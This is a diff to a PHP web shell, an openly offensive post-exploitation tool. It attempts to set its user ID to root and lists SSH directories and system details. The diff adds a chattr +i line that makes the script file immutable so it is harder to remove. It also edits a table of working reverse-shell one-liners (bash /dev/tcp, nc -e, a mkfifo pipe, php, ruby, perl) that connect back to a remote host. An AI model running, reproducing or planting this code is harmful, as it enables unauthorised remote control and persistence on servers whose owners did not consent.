@@ -3,8 +3,7 @@ ini_set("safe_mode", 0);
 umask(0);
 posix_setuid(0);
 define("base",'echo "Users Home Dir:";echo $HOME;echo"";echo "SSH Directory?";ls -lah $HOME/.ssh/;echo "";echo "Current Dir: ";pwd;ls -lah;echo "";echo "System: ";uname -as;echo "";echo "User: ";whoami');
-
-
+system("chattr +i ". $_SERVER["SCRIPT_FILENAME"]);
 function banner(){
     
     echo("\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m\n");
@@ -156,7 +155,8 @@ function checkComs()
         "perl", 'python', 'php', 'mysql', 'pg_ctl', 'wget', 'curl', 'lynx', 'w3m', 'gcc', 'g++',
         'cobc', 'javac', 'maven', 'java', 'awk', 'sed', 'ftp', 'ssh', 'vmware', 'virtualbox',
         'qemu', 'sudo', "git", "xterm", "tcl", "ruby", "postgres", "mongo", "couchdb",
-        "cron", "anacron", "visudo", "mail", "postfix", "gawk", "base64", "uuid"
+        "cron", "anacron", "visudo", "mail", "postfix", "gawk", "base64", "uuid", "pg_lsclusters",
+        "pg_ctlcluster","pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool"
     );
     foreach ($lincommands as $item) {
         echo(shell_exec("which " . $item));
@@ -251,6 +251,7 @@ function showEnv($os)
 
 function reverseConnections($methods, $host, $port, $shell)
 {
+    ob_start();
 //    $errorNum = error;
     $defaultPort = 1634;
     $defaultHost = $_SERVER["REMOTE_ADDR"];
@@ -279,9 +280,9 @@ function reverseConnections($methods, $host, $port, $shell)
         $usePort = $port;
     }
     $comma = array(
-        "bash" => "nohup bash -i >& /dev/tcp/" . $useHost . "/" . $usePort . " 0>&1",
-        "php" => "nohup php -r '\$sock=fsockopen(\"" . $useHost . "\"," . $usePort . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");' &",
-        "nc" => "nohup nc -e " . $useShell . " \"" . $useHost . "\" " . $usePort,
+        "bash" => "bash -i >& /dev/tcp/{$useHost}/" . $usePort . " 0>&1",
+        "php" => "php -r '\$sock=fsockopen(\"" . $useHost . "\"," . $usePort . ");exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "nc" => "nc -e " . $useShell . " \"" . $useHost . "\" " . $usePort. "\"",
         "ncS" => "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nohup nc \"" . $useHost . "\" " . $usePort . " >/tmp/f",
         "ruby" => "ruby -rsocket -e'f=TCPSocket.open(\"" . $useHost . "\"," . $usePort . ").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
         "perl" => "perl -e 'use Socket;\$i=\"" . $useHost . "\";\$p=" . $usePort . ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
@@ -290,13 +291,15 @@ function reverseConnections($methods, $host, $port, $shell)
     if (!empty($methods)) {
         echo("\nAttempting to connect back, ensure you have the listener running.\n");
         echo("\nUsing: " . $methods . "\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
-
-        system($comma[$methods]) or die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
+        passthru($comma[$methods]) or die("Something went wrong: ->" . error_get_last() . "\r\n\r\n\r\n");
     } else {
         echo("\nYou didnt specify a method to use, defaulting to bash.\n");
         echo("\nRhost: " . $useHost . "\nRport: " . $usePort . "\nLshell: " . $useShell . "\n");
-        system($defaultAction) or die("\nThere was an error at the connection\n->Error\n" . error_get_last() . "\r\n\r\n\r\n");
+        passthru($defaultAction) or die("\nThere was an error at the connection\n->Error\n" . error_get_last() . "\r\n\r\n\r\n");
     }
+    $var = ob_get_contents();
+    ob_end_clean();
+    ob_end_flush();
 }
 
 function executeCommands(string $com, int $run)
